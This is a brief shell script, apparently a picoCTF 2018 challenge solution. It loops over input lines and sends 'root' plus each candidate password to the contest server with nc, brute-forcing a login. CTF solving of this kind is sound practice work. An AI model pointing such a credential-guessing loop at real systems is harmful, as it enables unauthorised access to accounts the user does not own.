#!/bin/sh

while read -r LINE; do
	echo "root" > t
	echo "$LINE" >> t
	echo "$LINE"
	nc 2018shell3.picoctf.com 5221 < t
done
